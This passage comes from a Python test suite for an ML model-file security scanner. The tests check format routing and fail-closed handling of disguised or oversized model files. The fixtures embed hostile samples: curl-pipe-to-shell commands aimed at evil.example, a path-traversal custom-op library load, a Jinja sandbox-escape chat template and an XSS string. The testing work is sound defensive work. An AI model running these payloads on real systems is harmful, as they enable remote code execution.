    result = scan_file(str(config_path))

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata.get("scan_outcome_reasons", [])


def test_scan_file_fails_closed_for_generic_json_with_padded_node_object(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    config_path = tmp_path / "metadata.json"
    config_path.write_text(
        '{"nodes":[{"attrs":"'
        + ("x" * 129)
        + '","op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(config_path))

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata.get("scan_outcome_reasons", [])


def test_scan_file_oversized_generic_json_with_lone_array_heads_fails_closed(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    config_path = tmp_path / "config.json"
    config_path.write_text(
        '{"heads":["classification"],"padding":"' + ("x" * 256) + '"}',
        encoding="utf-8",
    )

    result = scan_file(str(config_path))

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata.get("scan_outcome_reasons", [])


def test_scan_file_oversized_generic_json_with_mxnet_heads_shape_fails_closed(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    config_path = tmp_path / "config.json"
    config_path.write_text(
        '{"heads":[[0,0,0]],"padding":"'
        + ("x" * 256)
        + '","nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0]}',
        encoding="utf-8",
    )

    result = scan_file(str(config_path))

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata.get("scan_outcome_reasons", [])


def test_scan_file_oversized_generic_json_with_hidden_mxnet_graph_fails_closed(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 128)
    config_path = tmp_path / "config.json"
    config_path.write_text(
        '{"padding":"'
        + ("x" * 256)
        + '","nodes":[{"op":"Custom","name":"load","attrs":{"library":"../../tmp/libevil.so"}}],'
        '"arg_nodes":[0],"heads":[[0,0,0]]}',
        encoding="utf-8",
    )

    result = scan_file(str(config_path))

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata.get("scan_outcome_reasons", [])


def test_scan_file_inconclusive_mxnet_config_preserves_jinja_analysis(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 256)
    config_path = tmp_path / "config.json"
    config_path.write_text(
        '{"heads":[[0,0,0]],"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}","nodes":[{"attrs":"'
        + ("x" * 300)
        + '","op":"Custom","name":"load"}],"arg_nodes":[0]}',
        encoding="utf-8",
    )

    result = scan_file(str(config_path), config={"cache_enabled": False})

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_inconclusive_mxnet_tokenizer_config_preserves_direct_jinja_analysis(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 256)
    tokenizer_path = tmp_path / "tokenizer_config.json"
    tokenizer_path.write_text(
        '{"heads":[[0,0,0]],"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}","nodes":[{"attrs":"'
        + ("x" * 300)
        + '","op":"Custom","name":"load"}],"arg_nodes":[0]}',
        encoding="utf-8",
    )

    result = scan_file(str(tokenizer_path), config={"cache_scan_results": False})

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_inconclusive_mxnet_generation_config_runs_selected_jinja_when_manifest_excluded(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 256)
    generation_path = tmp_path / "generation_config.json"
    generation_path.write_text(
        '{"heads":[[0,0,0]],"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}","nodes":[{"attrs":"'
        + ("x" * 300)
        + '","op":"Custom","name":"load"}],"arg_nodes":[0]}',
        encoding="utf-8",
    )

    result = scan_file(
        str(generation_path),
        config={"scanners": ["jinja2_template"], "cache_scan_results": False},
    )

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert "manifest" in result.metadata["skipped_scanner_ids"]
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_inconclusive_mxnet_malformed_generation_config_runs_jinja_after_manifest_parse_failure(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "MXNET_SYMBOL_SIGNATURE_READ_BYTES", 256)
    generation_path = tmp_path / "generation_config.json"
    generation_path.write_text(
        '{"heads":[[0,0,0]],"arg_nodes":[0],'
        '"chat_template":"{{ \'\'.__class__.__mro__[1].__subclasses__() }}","padding":"' + ("x" * 300),
        encoding="utf-8",
    )

    result = scan_file(
        str(generation_path),
        config={"scanners": ["manifest", "jinja2_template"], "cache_scan_results": False},
    )

    assert result.success is False
    assert "mxnet_symbol_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert "manifest_parse_failed" in result.metadata["scan_outcome_reasons"]
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_routes_misnamed_ggml_by_header(tmp_path: Path) -> None:
    disguised_ggml = tmp_path / "model.payload"
    disguised_ggml.write_bytes(b"GGML" + (1).to_bytes(4, "little") + b"\x00" * 24)

    result = scan_file(str(disguised_ggml))

    assert result.scanner_name == "gguf"
    assert result.metadata["format"] == "ggml"
    assert result.metadata["version"] == 1


def test_scan_file_routes_gguf_chat_templates_through_jinja_analysis(tmp_path: Path) -> None:
    gguf_path = create_mock_gguf(
        tmp_path / "model.gguf",
        metadata={"tokenizer.chat_template": "{{ ''.__class__.__mro__[1].__subclasses__() }}"},
    )

    result = scan_file(str(gguf_path), config={"cache_scan_results": False})

    assert result.scanner_name == "gguf"
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_does_not_route_gguf_magic_near_match_to_gguf(tmp_path: Path) -> None:
    near_match = tmp_path / "model.payload"
    near_match.write_bytes(b"GGU?" + b"\x00" * 32)

    result = scan_file(str(near_match))

    assert result.scanner_name == "unknown"
    assert result.issues == []


def test_scan_file_keeps_torch_marker_safetensors_on_safetensors_scanner(tmp_path: Path) -> None:
    file_path = tmp_path / "torch-marker-metadata.safetensors"
    header = {
        "__metadata__": {
            "framework": "torch",
            "kind": "tensor nn.Sequential",
            "description": "<script>alert('xss')</script>",
        },
        "t": {"dtype": "F32", "shape": [1], "data_offsets": [0, 4]},
    }
    header_bytes = json.dumps(header, separators=(",", ":")).encode()
    file_path.write_bytes(len(header_bytes).to_bytes(8, "little") + header_bytes + b"\x00" * 4)

    result = scan_file(str(file_path))

    assert result.scanner_name == "safetensors"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_scan_file_detects_malicious_torch7_with_misleading_suffix(tmp_path: Path) -> None:
    disguised_torch7 = tmp_path / "payload.jpg"
    disguised_torch7.write_bytes(
        b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
        b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
        b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
    )

    result = scan_file(str(disguised_torch7))

    assert result.scanner_name == "torch7"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


@pytest.mark.parametrize("embedded_format", ["cntk", "lightgbm"])
def test_scan_file_prioritizes_malicious_torch7_over_embedded_content_signatures(
    tmp_path: Path,
    embedded_format: str,
) -> None:
    disguised_torch7 = tmp_path / f"payload-{embedded_format}.jpg"
    payload = (
        b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
        b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
        b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
    )
    if embedded_format == "cntk":
        embedded_payload = tmp_path / "embedded.cmf"
        _write_malicious_cntk(embedded_payload)
        payload += embedded_payload.read_bytes()
    else:
        embedded_payload = tmp_path / "embedded.lgb"
        _write_malicious_lightgbm(embedded_payload)
        payload += b"\x00" + embedded_payload.read_bytes()
    disguised_torch7.write_bytes(payload)

    result = scan_file(str(disguised_torch7))

    assert result.scanner_name == "torch7"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


@pytest.mark.parametrize("filename", ["payload.onnx", "payload.pt", "payload.gz", "payload.tar.gz"])
def test_scan_file_detects_malicious_torch7_with_recognized_misleading_suffix(
    tmp_path: Path,
    filename: str,
) -> None:
    disguised_torch7 = tmp_path / filename
    disguised_torch7.write_bytes(
        b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
        b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
        b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
    )

    result = scan_file(str(disguised_torch7))

    assert result.scanner_name == "torch7"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_scan_file_does_not_route_torch_source_near_match_with_misleading_suffix(tmp_path: Path) -> None:
    source_near_match = tmp_path / "source.jpg"
    source_near_match.write_text("import torch\nimport torch.nn as nn\n\nclass Model(nn.Module):\n    pass\n")

    result = scan_file(str(source_near_match))

    assert result.scanner_name == "unknown"
    assert not any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_scan_file_routes_extensionless_llamafile(tmp_path: Path) -> None:
    extensionless_llamafile = tmp_path / "llama"
    extensionless_llamafile.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llamafile runtime")

    result = scan_file(str(extensionless_llamafile))

    assert result.scanner_name == "llamafile"


def test_scan_file_routes_extensionless_middle_marker_llamafile(tmp_path: Path) -> None:
    extensionless_llamafile = tmp_path / "llama"
    extensionless_llamafile.write_bytes(
        b"\x7fELF"
        + b"\x02\x01\x01\x00"
        + b"\x00" * 56
        + b"A" * (2 * 1024 * 1024 + 64)
        + b"llamafile runtime"
        + b"B" * (2 * 1024 * 1024 + 64)
    )

    result = scan_file(str(extensionless_llamafile))

    assert result.scanner_name == "llamafile"


def test_scan_file_detects_malicious_extensionless_middle_marker_llamafile(tmp_path: Path) -> None:
    extensionless_llamafile = tmp_path / "llama"
    extensionless_llamafile.write_bytes(
        b"\x7fELF"
        + b"\x02\x01\x01\x00"
        + b"\x00" * 56
        + b"A" * (2 * 1024 * 1024 + 64)
        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
        + b"B" * (2 * 1024 * 1024 + 64)
    )

    result = scan_file(str(extensionless_llamafile))

    assert result.scanner_name == "llamafile"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_scan_file_detects_malicious_extensionless_llamafile(tmp_path: Path) -> None:
    extensionless_llamafile = tmp_path / "llama"
    extensionless_llamafile.write_bytes(
        b"\x7fELF"
        + b"\x02\x01\x01\x00"
        + b"\x00" * 56
        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
    )

    result = scan_file(str(extensionless_llamafile))

    assert result.scanner_name == "llamafile"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_scan_file_detects_malicious_llamafile_with_misleading_suffix(tmp_path: Path) -> None:
    disguised_llamafile = tmp_path / "payload.jpg"
    disguised_llamafile.write_bytes(
        b"\x7fELF"
        + b"\x02\x01\x01\x00"
        + b"\x00" * 56
        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
    )

    result = scan_file(str(disguised_llamafile))

    assert result.scanner_name == "llamafile"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_scan_file_detects_malicious_llamafile_with_onnx_suffix(tmp_path: Path) -> None:
    disguised_llamafile = tmp_path / "payload.onnx"
    disguised_llamafile.write_bytes(
        b"\x7fELF"
        + b"\x02\x01\x01\x00"
        + b"\x00" * 56
        + b"llamafile runtime\nbash -c curl http://evil.example/payload.sh"
    )

    result = scan_file(str(disguised_llamafile))

    assert result.scanner_name == "llamafile"
    assert any(issue.severity == IssueSeverity.CRITICAL for issue in result.issues)


def test_scan_file_benign_llamafile_with_onnx_suffix_reports_format_mismatch(tmp_path: Path) -> None:
    disguised_llamafile = tmp_path / "safe.onnx"
    disguised_llamafile.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llamafile runtime\n--threads 4")

    result = scan_model_directory_or_file(str(disguised_llamafile), cache_scan_results=False)

    assert "llamafile" in result.scanner_names
    assert any(issue.message.startswith("File type validation failed") for issue in result.issues)
    assert core_module.determine_exit_code(result) == 1


def test_scan_file_does_not_route_extensionless_llamafile_near_match(tmp_path: Path) -> None:
    generic_executable = tmp_path / "tool"
    generic_executable.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llama-file runtime")

    result = scan_file(str(generic_executable))

    assert result.scanner_name == "unknown"
    assert result.issues == []


def test_scan_file_does_not_route_misleading_suffix_llamafile_near_match(tmp_path: Path) -> None:
    generic_executable = tmp_path / "tool.jpg"
    generic_executable.write_bytes(b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llama-file runtime")

    result = scan_file(str(generic_executable))

    assert result.scanner_name == "unknown"
    assert result.issues == []


def test_scan_file_routes_middle_marker_llamafile_exe(tmp_path: Path) -> None:
    middle_marker = tmp_path / "middle-marker.exe"
    middle_marker.write_bytes(
        b"MZ" + b"\x00" * 62 + b"A" * (2 * 1024 * 1024 + 64) + b"llamafile runtime" + b"B" * (2 * 1024 * 1024 + 64)
    )

    result = scan_file(str(middle_marker))

    assert result.scanner_name == "llamafile"


def test_scan_file_routes_tail_marker_llamafile_exe(tmp_path: Path) -> None:
    tail_marker = tmp_path / "tail-marker.exe"
    tail_marker.write_bytes(b"MZ" + b"\x00" * 62 + b"A" * ((8 * 1024 * 1024) + 64) + b"llamafile runtime")

    result = scan_file(str(tail_marker))

    assert result.scanner_name == "llamafile"


def test_scan_file_routes_misnamed_onnx_by_header(tmp_path: Path) -> None:
    pytest.importorskip("onnx")
    disguised_onnx = tmp_path / "model.payload"
    create_mock_onnx(disguised_onnx)

    result = scan_file(str(disguised_onnx))

    assert result.scanner_name == "onnx"


def test_scan_file_routes_onnx_pb_by_content(tmp_path: Path) -> None:
    pytest.importorskip("onnx")
    onnx_pb = tmp_path / "model.pb"
    create_mock_onnx(onnx_pb)

    result = scan_file(str(onnx_pb))

    assert result.scanner_name == "onnx"
    assert not any(check.name == "Format Validation" for check in result.checks)


def test_scan_file_detects_malicious_onnx_pb_by_content(tmp_path: Path) -> None:
    pytest.importorskip("onnx")
    onnx_pb = tmp_path / "malicious.pb"
    create_mock_onnx(onnx_pb, op_type="PythonOp")

    result = scan_file(str(onnx_pb))

    assert result.scanner_name == "onnx"
    assert not any(check.name == "Format Validation" for check in result.checks)
    assert any(
        issue.severity == IssueSeverity.CRITICAL and issue.details.get("op_type") == "PythonOp"
        for issue in result.issues
    )


def test_scan_file_detects_malicious_prefixed_renamed_onnx_by_content(tmp_path: Path) -> None:
    pytest.importorskip("onnx")
    disguised_onnx = create_mock_onnx(tmp_path / "malicious.jpg", op_type="PythonOp")
    prefix_mock_onnx_with_unknown_field(disguised_onnx, value_size=(1024 * 1024) + 32)

    result = scan_file(str(disguised_onnx), config={"cache_scan_results": False})

    assert result.scanner_name == "onnx"
    assert result.success is False
    assert any(
        issue.severity == IssueSeverity.CRITICAL and issue.details.get("op_type") == "PythonOp"
        for issue in result.issues
    )


def test_scan_file_detects_malicious_budget_prefixed_declared_onnx(tmp_path: Path) -> None:
    pytest.importorskip("onnx")
    declared_onnx = create_mock_onnx(tmp_path / "malicious.onnx", op_type="PythonOp")
    prefix_mock_onnx_with_unknown_field(declared_onnx, value_size=0, count=4097, field_number=2)

    result = scan_file(str(declared_onnx), config={"cache_scan_results": False})
    aggregate = scan_model_directory_or_file(str(declared_onnx), cache_scan_results=False)

    assert result.scanner_name == "onnx"
    assert any(
        issue.severity == IssueSeverity.CRITICAL and issue.details.get("op_type") == "PythonOp"
        for issue in result.issues
    )
    assert core_module.determine_exit_code(aggregate) == 1


@pytest.mark.parametrize("field_number", [2, 9])
def test_scan_file_fails_closed_on_budget_exhausted_prefixed_renamed_onnx(
    tmp_path: Path,
    field_number: int,
) -> None:
    pytest.importorskip("onnx")
    disguised_onnx = create_mock_onnx(tmp_path / "many-prefixes.jpg", op_type="PythonOp")
    prefix_mock_onnx_with_unknown_field(disguised_onnx, value_size=0, count=4097, field_number=field_number)

    result = scan_file(str(disguised_onnx), config={"cache_scan_results": False})
    aggregate = scan_model_directory_or_file(str(disguised_onnx), cache_scan_results=False)

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert result.metadata["operational_error_reason"] == "onnx_routing_incomplete"
    assert any(issue.details.get("format") == ONNX_ROUTING_INCONCLUSIVE_FORMAT for issue in result.issues)
    assert not any(issue.details.get("op_type") == "PythonOp" for issue in result.issues)
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_fails_closed_on_budget_exhausted_group_prefixed_renamed_onnx(tmp_path: Path) -> None:
    pytest.importorskip("onnx")
    disguised_onnx = create_mock_onnx(tmp_path / "group-many-prefixes.jpg", op_type="PythonOp")
    prefix_mock_onnx_with_unknown_group(disguised_onnx)

    result = scan_file(str(disguised_onnx), config={"cache_scan_results": False})
    aggregate = scan_model_directory_or_file(str(disguised_onnx), cache_scan_results=False)

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert result.metadata["operational_error_reason"] == "onnx_routing_incomplete"
    assert any(issue.details.get("format") == ONNX_ROUTING_INCONCLUSIVE_FORMAT for issue in result.issues)
    assert not any(issue.details.get("op_type") == "PythonOp" for issue in result.issues)
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_fails_closed_on_budget_exhausted_onnx_flax_overlap(tmp_path: Path) -> None:
    pytest.importorskip("onnx")
    disguised_onnx = create_mock_onnx(tmp_path / "flax-overlap.jpg", op_type="PythonOp")
    prefix_mock_onnx_with_unknown_field(disguised_onnx, value_size=0, count=4097, field_number=100)

    result = scan_file(str(disguised_onnx), config={"cache_scan_results": False})
    aggregate = scan_model_directory_or_file(str(disguised_onnx), cache_scan_results=False)

    assert result.scanner_name == "flax_msgpack"
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert "flax_msgpack_routing_incomplete" in result.metadata["scan_outcome_reasons"]
    assert not any(issue.details.get("op_type") == "PythonOp" for issue in result.issues)
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_fails_closed_on_budget_exhausted_renamed_onnx_without_structure(tmp_path: Path) -> None:
    pytest.importorskip("onnx")
    ambiguous_onnx = tmp_path / "ambiguous.jpg"
    ambiguous_onnx.write_bytes((b"\x4a\x00" * 4097) + b"\x00malformed-tail")
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }

    reset_cache_manager()
    try:
        result = scan_file(str(ambiguous_onnx), config=config)
        repeated_result = scan_file(str(ambiguous_onnx), config=config)

        assert result.scanner_name == "unknown"
        assert result.success is False
        assert repeated_result.success is False
        assert result.metadata["scan_outcome"] == "inconclusive"
        assert "onnx_routing_incomplete" in result.metadata["scan_outcome_reasons"]
        assert result.metadata["operational_error_reason"] == "onnx_routing_incomplete"
        check = next(check for check in result.checks if check.name == "ONNX Routing")
        assert check.details["format"] == ONNX_ROUTING_INCONCLUSIVE_FORMAT
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()

    aggregate = scan_model_directory_or_file(str(ambiguous_onnx), cache_scan_results=False)
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_detects_malicious_renamed_tf_metagraph_by_content(tmp_path: Path) -> None:
    disguised_metagraph = tmp_path / "malicious.jpg"
    disguised_metagraph.write_bytes(b"\xa2\x06\x80\x08" + (b"x" * 1024) + _build_malicious_tf_metagraph())

    result = scan_file(str(disguised_metagraph), config={"cache_scan_results": False})

    assert result.scanner_name == "tf_metagraph"
    assert result.success is False
    assert any(
        issue.severity == IssueSeverity.CRITICAL
        and issue.message == "Dangerous TensorFlow operation: PyFunc"
        and issue.details.get("op_type") == "PyFunc"
        for issue in result.issues
    )


def test_scan_file_detects_malicious_renamed_tf_function_metagraph_by_content(tmp_path: Path) -> None:
    disguised_metagraph = tmp_path / "function-malicious.jpg"
    disguised_metagraph.write_bytes(_build_malicious_tf_function_metagraph())

    result = scan_file(str(disguised_metagraph), config={"cache_scan_results": False})

    assert result.scanner_name == "tf_metagraph"
    assert result.success is False
    assert any(issue.details.get("op_type") == "PyFunc" for issue in result.issues)


def test_scan_file_detects_malicious_renamed_tf_savedmodel_by_content(tmp_path: Path) -> None:
    disguised_savedmodel = tmp_path / "saved.jpg"
    disguised_savedmodel.write_bytes(_build_malicious_tf_savedmodel())

    result = scan_file(str(disguised_savedmodel), config={"cache_scan_results": False})

    assert result.scanner_name == "tf_savedmodel"
    assert result.success is False
    assert any(
        issue.severity == IssueSeverity.CRITICAL and "PyFunc operation detected" in issue.message
        for issue in result.issues
    )


def test_scan_file_detects_malicious_tf_savedmodel_renamed_with_meta_suffix(tmp_path: Path) -> None:
    disguised_savedmodel = tmp_path / "saved.meta"
    disguised_savedmodel.write_bytes(_build_malicious_tf_savedmodel())

    result = scan_file(str(disguised_savedmodel), config={"cache_scan_results": False})

    assert result.scanner_name == "tf_savedmodel"
    assert result.success is False
    assert any(
        issue.severity == IssueSeverity.CRITICAL and "PyFunc operation detected" in issue.message
        for issue in result.issues
    )


def test_scan_file_inspects_renamed_tf_savedmodel_collection_payloads(tmp_path: Path) -> None:
    disguised_savedmodel = tmp_path / "collection.jpg"
    disguised_savedmodel.write_bytes(_build_collection_only_tf_savedmodel())

    result = scan_file(str(disguised_savedmodel), config={"cache_scan_results": False})

    assert result.scanner_name == "tf_savedmodel"
    assert any(check.name == "SavedModel Collection Executable Pattern" for check in result.checks)


def test_scan_file_inspects_renamed_tf_metagraph_collection_only_payloads(tmp_path: Path) -> None:
    disguised_metagraph = tmp_path / "collection-only.jpg"
    disguised_metagraph.write_bytes(_build_collection_only_tf_metagraph())

    result = scan_file(str(disguised_metagraph), config={"cache_scan_results": False})

    assert result.scanner_name == "tf_metagraph"
    assert any(check.name == "MetaGraph Collection Executable Pattern" for check in result.checks)


def test_scan_file_does_not_flag_benign_renamed_tf_metagraph_collection_metadata(tmp_path: Path) -> None:
    disguised_metagraph = tmp_path / "benign-collection-only.jpg"
    disguised_metagraph.write_bytes(
        _build_collection_only_tf_metagraph(value=b"documentation: https://example.invalid/runtime")
    )

    result = scan_file(str(disguised_metagraph), config={"cache_scan_results": False})

    assert result.scanner_name == "tf_metagraph"
    assert result.success is True
    assert not any(check.name == "MetaGraph Structural Validation" for check in result.checks)
    assert not any(check.name == "MetaGraph Collection Executable Pattern" for check in result.checks)


def test_scan_file_does_not_flag_benign_renamed_tf_savedmodel_collection_metadata(tmp_path: Path) -> None:
    disguised_savedmodel = tmp_path / "benign-collection.jpg"
    disguised_savedmodel.write_bytes(
        _build_collection_only_tf_savedmodel(value=b"documentation: https://example.invalid/runtime")
    )

    result = scan_file(str(disguised_savedmodel), config={"cache_scan_results": False})

    assert result.scanner_name == "tf_savedmodel"
    assert not any(check.name == "SavedModel Collection Executable Pattern" for check in result.checks)


def test_scan_file_fails_closed_for_oversized_renamed_tf_savedmodel_without_caching(tmp_path: Path) -> None:
    disguised_savedmodel = tmp_path / "saved-large.jpg"
    seed = _build_malicious_tf_savedmodel()
    disguised_savedmodel.write_bytes(seed + (b"x" * (_MAX_PARSE_BYTES + 1 - len(seed))))
    cache_dir = tmp_path / "cache"
    config = {"cache_enabled": True, "cache_dir": str(cache_dir), "min_cache_file_size": 0}

    reset_cache_manager()
    try:
        first = scan_file(str(disguised_savedmodel), config=config)
        second = scan_file(str(disguised_savedmodel), config=config)

        assert first.scanner_name == "tf_savedmodel"
        assert first.success is False
        assert second.success is False
        assert first.metadata["operational_error_reason"] == "savedmodel_parse_budget_exceeded"
        assert any("SavedModel exceeds bounded parse budget" in issue.message for issue in first.issues)
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()

    aggregate = scan_model_directory_or_file(str(disguised_savedmodel), cache_scan_results=False)
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_fails_closed_for_incomplete_tf_protobuf_routing_without_caching(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(file_detection, "_TF_METAGRAPH_MAX_ROUTING_FIELDS", 2)
    ambiguous_payload = tmp_path / "ambiguous-routing.jpg"
    ambiguous_payload.write_bytes(b"\x08\x01" + (b"\x18\x00" * 4))
    cache_dir = tmp_path / "cache"
    config = {"cache_enabled": True, "cache_dir": str(cache_dir), "min_cache_file_size": 0}

    reset_cache_manager()
    try:
        first = scan_file(str(ambiguous_payload), config=config)
        second = scan_file(str(ambiguous_payload), config=config)

        assert first.scanner_name == "unknown"
        assert first.success is False
        assert second.success is False
        assert first.metadata["scan_outcome"] == "inconclusive"
        assert first.metadata["operational_error_reason"] == "tensorflow_protobuf_routing_incomplete"
        assert "tensorflow_protobuf_routing_incomplete" in first.metadata["scan_outcome_reasons"]
        check = next(check for check in first.checks if check.name == "TensorFlow Protobuf Routing")
        assert "bounded structural probe reached its limit" in check.message
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()

    aggregate = scan_model_directory_or_file(str(ambiguous_payload), cache_scan_results=False)
    assert core_module.determine_exit_code(aggregate) == 2


@pytest.mark.parametrize(
    "filename",
    ["versioned-oversized-field-two.jpg", "versioned-oversized-field-two.py", "versioned-oversized-field-two.pyw"],
)
def test_scan_file_keeps_versioned_oversized_protobuf_on_inconclusive_route_without_caching(
    tmp_path: Path,
    filename: str,
) -> None:
    generic_payload = tmp_path / filename
    oversized_field_size = _MAX_PARSE_BYTES + 1
    generic_payload.write_bytes(b"\x08\x01" + b"\x12\x81\x80\x80\x0a" + (b"x" * oversized_field_size))
    cache_dir = tmp_path / "cache"
    config = {"cache_enabled": True, "cache_dir": str(cache_dir), "min_cache_file_size": 0}

    reset_cache_manager()
    try:
        result = scan_file(str(generic_payload), config=config)
        repeated_result = scan_file(str(generic_payload), config=config)

        assert result.scanner_name == "unknown"
        assert result.success is False
        assert repeated_result.success is False
        assert result.metadata["operational_error_reason"] == "tensorflow_protobuf_routing_incomplete"
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()

    aggregate = scan_model_directory_or_file(str(generic_payload), cache_scan_results=False)
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_routes_oversized_renamed_tf_metagraph_to_fail_closed_scan(tmp_path: Path) -> None:
    disguised_metagraph = tmp_path / "oversized.jpg"
    seed = _build_malicious_tf_metagraph()
    disguised_metagraph.write_bytes(seed + (b"x" * (_MAX_PARSE_BYTES + 1 - len(seed))))
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }

    reset_cache_manager()
    try:
        result = scan_file(str(disguised_metagraph), config=config)
        repeated_result = scan_file(str(disguised_metagraph), config=config)

        assert result.scanner_name == "tf_metagraph"
        assert result.success is False
        assert repeated_result.success is False
        assert result.metadata["operational_error_reason"] == "metagraph_parse_budget_exceeded"
        assert any("MetaGraph exceeds bounded parse budget" in issue.message for issue in result.issues)
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()

    aggregate = scan_model_directory_or_file(str(disguised_metagraph), cache_scan_results=False)
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_does_not_route_oversized_malformed_tf_protobuf_near_match(tmp_path: Path) -> None:
    malformed_payload = tmp_path / "malformed-large.jpg"
    malformed_payload.write_bytes(b"\x12\x81\x80\x80\x0a" + (b"x" * 1024))

    result = scan_file(str(malformed_payload), config={"cache_enabled": False})
    aggregate = scan_model_directory_or_file(str(malformed_payload), cache_enabled=False)

    assert result.scanner_name == "unknown"
    assert result.success is True
    assert aggregate.success is True
    assert core_module.determine_exit_code(aggregate) == 0


def test_scan_file_routes_large_field_two_protobuf_to_fail_closed_tensorflow_scan(tmp_path: Path) -> None:
    generic_payload = tmp_path / "candidate-large.jpg"
    generic_payload.write_bytes(b"\x0a\x03\x0a\x01x" + b"\x12\x81\x80\x80\x0a" + (b"x" * (_MAX_PARSE_BYTES + 1)))

    result = scan_file(str(generic_payload), config={"cache_enabled": False})
